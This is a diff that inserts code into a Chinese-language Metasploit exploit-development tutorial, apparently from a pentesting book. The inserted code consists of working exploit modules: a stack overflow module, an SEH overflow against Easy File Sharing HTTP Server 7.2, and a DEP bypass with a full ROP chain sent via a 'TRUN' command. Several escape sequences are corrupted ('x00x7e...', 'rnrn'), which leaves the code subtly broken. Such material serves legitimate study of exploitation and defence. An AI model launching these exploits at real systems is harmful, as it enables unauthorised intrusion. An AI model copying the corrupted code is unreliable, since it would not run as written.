@@ -249,7 +249,14 @@ NOP 或 NOP-sled 是无操作指令，仅仅将程序执行滑动到下一个内
 
 我们需要在利用的`Payload`部分定义这些坏字符。让我们看一个例子：
 
-[PRE0]
+```
+'Payload'        => 
+      { 
+        'Space'    => 800, 
+        'BadChars' => "\x00\x20\x0a\x0d", 
+        'StackAdjustment' => -3500, 
+      }, 
+```
 
 上述部分摘自`/exploit/windows/ftp`目录下的`freeftpd_user.rb`文件。列出的选项表明有效载荷的空间应小于`800`字节，并且有效载荷应避免使用`0x00`、`0x20`、`0x0a`和`0x0d`，分别是空字节、空格、换行和回车。
 
@@ -269,7 +276,40 @@ NOP 或 NOP-sled 是无操作指令，仅仅将程序执行滑动到下一个内
 
 我们可以看到我们拥有开发 Metasploit 模块的所有基本要素。这是因为在 Metasploit 中，有效载荷生成是自动化的，并且也可以随时更改。所以，让我们开始吧：
 
-[PRE1]
+```
+class MetasploitModule < Msf::Exploit::Remote 
+  Rank = NormalRanking 
+
+  include Msf::Exploit::Remote::Tcp 
+
+  def initialize(info = {}) 
+    super(update_info(info, 
+      'Name'                 => 'Stack Based Buffer Overflow Example', 
+      'Description'    => %q{ 
+         Stack Based Overflow Example Application Exploitation Module 
+      }, 
+      'Platform'             => 'win', 
+      'Author'         => 
+        [ 
+          'Nipun Jaswal' 
+        ], 
+      'Payload' => 
+      { 
+      'space' => 1000, 
+      'BadChars' => "\x00\xff", 
+      }, 
+      'Targets' => 
+       [ 
+             ['Windows XP SP2',{ 'Ret' => 0x71AB9372, 'Offset' => 520}] 
+       ], 
+      'DisclosureDate' => 'Mar 04 2018' 
+   )) 
+   register_options( 
+   [ 
+         Opt::RPORT(200) 
+   ]) 
+  end 
+```
 
 在编写代码之前，让我们看一下我们在这个模块中使用的库：
 
@@ -294,7 +334,17 @@ NOP 或 NOP-sled 是无操作指令，仅仅将程序执行滑动到下一个内
 
 我们还在`register_options`部分将利用模块的默认端口定义为`200`。让我们来看看剩下的代码：
 
-[PRE2]
+```
+def exploit 
+    connect 
+    buf = make_nops(target['Offset']) 
+    buf = buf + [target['Ret']].pack('V') + make_nops(30) + payload.encoded 
+    sock.put(buf) 
+    handler 
+    disconnect 
+  end 
+end
+```
 
 让我们了解一些在前面的代码中使用的重要函数：
 
@@ -429,7 +479,42 @@ Mona 脚本是 Immunity Debugger 的 Python 驱动插件，提供了各种利用
 
 现在我们已经有了利用目标应用程序的所有重要数据，让我们继续在 Metasploit 中创建一个利用模块，如下：
 
-[PRE3]
+```
+class MetasploitModule < Msf::Exploit::Remote 
+
+  Rank = NormalRanking 
+
+  include Msf::Exploit::Remote::Tcp 
+  include Msf::Exploit::Seh 
+
+  def initialize(info = {}) 
+    super(update_info(info, 
+      'Name'           => 'Easy File Sharing HTTP Server 7.2 SEH Overflow', 
+      'Description'    => %q{ 
+        This module demonstrate SEH based overflow example 
+      }, 
+      'Author'         => 'Nipun', 
+      'License'        => MSF_LICENSE, 
+      'Privileged'     => true, 
+      'DefaultOptions' => 
+        { 
+          'EXITFUNC' => 'thread', 
+     'RPORT' => 80, 
+        }, 
+      'Payload'        => 
+        { 
+          'Space'    => 390, 
+          'BadChars' => "x00x7ex2bx26x3dx25x3ax22x0ax0dx20x2fx5cx2e", 
+        }, 
+      'Platform'       => 'win', 
+      'Targets'        => 
+        [ 
+          [ 'Easy File Sharing 7.2 HTTP', { 'Ret' => 0x10019798, 'Offset' => 4061 } ], 
+        ], 
+      'DisclosureDate' => 'Mar 4 2018', 
+      'DefaultTarget'  => 0)) 
+  end 
+```
 
 在处理各种模块的头部部分后，我们开始包含库文件的所需部分。接下来，我们定义类和模块类型，就像我们在之前的模块中所做的那样。我们通过定义名称、描述、作者信息、许可信息、有效载荷选项、披露日期和默认目标来开始`initialize`部分。我们在`Ret`返回地址变量和`Offset`字段下使用`4061`作为 POP/POP/RET 指令的地址。我们使用`4061`而不是`4065`，因为 Metasploit 将自动生成短跳转指令到 shellcode；因此，我们将从`4065`字节前开始 4 个字节，以便将短跳转放入载体中，以用于下一个 SEH 记录的地址。
 
@@ -441,7 +526,21 @@ Mona 脚本是 Immunity Debugger 的 Python 驱动插件，提供了各种利用
 
 让我们继续编写代码，如下：
 
-[PRE4]
+```
+def exploit 
+  connect 
+  weapon = "HEAD " 
+  weapon << make_nops(target['Offset']) 
+  weapon << generate_seh_record(target.ret) 
+  weapon << make_nops(19) 
+  weapon << payload.encoded 
+  weapon << " HTTP/1.0rnrn" 
+  sock.put(weapon) 
+  handler 
+  disconnect 
+  end 
+end 
+```
 
 `exploit`函数首先通过连接到目标开始。接下来，它通过在`HEAD`请求中附加`4061`个 NOP 生成一个恶意的`HEAD`请求。接下来，`generate_seh_record()`函数生成一个`8`字节的`SEH`记录，其中前 4 个字节形成了跳转到有效载荷的指令。通常，这 4 个字节包含诸如`\xeb\x0A\x90\x90`的指令，其中`\xeb`表示跳转指令，`\x0A`表示要跳转的`12`字节，而`\x90\x90 NOP`指令则作为填充完成了 4 个字节。
 
@@ -553,11 +652,85 @@ Metasploit 提供了一个非常方便的工具来查找 ROP 小工具：`msfrop
 
 在这一部分，我们将为同一个易受攻击的应用程序编写 DEP 绕过利用，我们在利用栈溢出漏洞时失败了，因为 DEP 已启用。该应用程序在 TCP 端口`9999`上运行。因此，让我们快速构建一个模块，并尝试在同一应用程序上绕过 DEP：
 
-[PRE5]
+```
+class MetasploitModule < Msf::Exploit::Remote 
+  Rank = NormalRanking 
+
+  include Msf::Exploit::Remote::Tcp 
+
+  def initialize(info = {}) 
+    super(update_info(info, 
+      'Name'                 => 'DEP Bypass Exploit', 
+      'Description'    => %q{ 
+         DEP Bypass Using ROP Chains Example Module 
+      }, 
+      'Platform'             => 'win', 
+      'Author'         => 
+        [ 
+          'Nipun Jaswal' 
+        ], 
+      'Payload' => 
+      { 
+      'space' => 312, 
+      'BadChars' => "\x00", 
+      }, 
+      'Targets' => 
+       [ 
+                  ['Windows 7 Professional',{ 'Offset' => 2006}] 
+       ], 
+      'DisclosureDate' => 'Mar 4 2018' 
+   )) 
+   register_options( 
+   [ 
+         Opt::RPORT(9999) 
+   ]) 
+  end 
+```
 
 我们已经编写了许多模块，并对所需的库和初始化部分非常熟悉。此外，我们不需要返回地址，因为我们使用的是自动构建机制跳转到 shellcode 的 ROP 链。让我们专注于利用部分：
 
-[PRE6]
+```
+def create_rop_chain() 
+
+    # rop chain generated with mona.py - www.corelan.be 
+    rop_gadgets =  
+    [ 
+      0x77dfb7e4,  # POP ECX # RETN [RPCRT4.dll]  
+      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll] 
+      0x76a5fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll]  
+      0x766a70d7,  # POP EBP # RETN [USP10.dll]  
+      0x625011bb,  # & jmp esp [essfunc.dll] 
+      0x777f557c,  # POP EAX # RETN [msvcrt.dll]  
+      0xfffffdff,  # Value to negate, will become 0x00000201 
+      0x765e4802,  # NEG EAX # RETN [user32.dll]  
+      0x76a5f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll]  
+      0x7779f5d4,  # POP EAX # RETN [msvcrt.dll]  
+      0xffffffc0,  # Value to negate, will become 0x00000040 
+      0x765e4802,  # NEG EAX # RETN [user32.dll]  
+      0x76386fc0,  # XCHG EAX,EDX # RETN [kernel32.dll]  
+      0x77dfd09c,  # POP ECX # RETN [RPCRT4.dll]  
+      0x62504dfc,  # &Writable location [essfunc.dll] 
+      0x77e461e1,  # POP EDI # RETN [RPCRT4.dll]  
+      0x765e4804,  # RETN (ROP NOP) [user32.dll] 
+      0x777f3836,  # POP EAX # RETN [msvcrt.dll]  
+      0x90909090,  # nop 
+      0x77d43c64,  # PUSHAD # RETN [ntdll.dll]  
+    ].flatten.pack("V*") 
+
+    return rop_gadgets 
+
+  end 
+  def exploit 
+    connect 
+    rop_chain = create_rop_chain() 
+    junk = rand_text_alpha_upper(target['Offset']) 
+    buf = "TRUN ."+junk + rop_chain  + make_nops(16) + payload.encoded+'rn' 
+    sock.put(buf) 
+    handler 
+    disconnect 
+  end 
+end 
+```
 
 我们可以看到，我们将 Mona 脚本生成的`rop_chains.txt`文件中的整个`create_rop_chain`函数复制到了我们的利用中。
 
